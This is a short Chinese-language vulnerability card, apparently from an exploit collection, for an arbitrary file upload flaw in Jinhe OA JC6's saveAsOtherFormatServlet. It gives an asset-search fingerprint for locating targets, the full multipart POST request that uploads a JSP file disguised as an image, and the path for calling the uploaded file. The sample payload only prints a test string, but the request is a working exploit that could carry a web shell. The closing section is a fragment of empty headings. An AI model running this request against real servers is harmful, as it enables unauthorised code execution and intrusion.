# 金和OAJC6saveAsOtherFormatServlet任意文件上传漏洞

- **系统**：金和OA　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`web.body="JC6金和协同管理平台"`
- **请求**：`POST /jc6/servlet/saveAsOtherFormatServlet?fileName=stc.jsp HTTP/1.1`
- **关键头**：`Content-Length: 207`　`Content-Type: multipart/form-data; boundary=74f0dc3df975274386a11be68cacc0…`

**请求体 / payload**
```
--74f0dc3df975274386a11be68cacc0e5
Content-Disposition: form-data; name="FileBlod"; filename="stc.jsp"
Content-Type: image/png
<% out.println("tteesstt2");%>
--74f0dc3df975274386a11be68cacc0e5--

上传文件位置
GET /jc6/upload/gwzw/stc.jsp HTTP/1.1
Host:
Content-Length: 0
```

**其他**
- 金和OA JC6 saveAsOtherFormatServlet任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞简介
***
- 版本: * 金和OA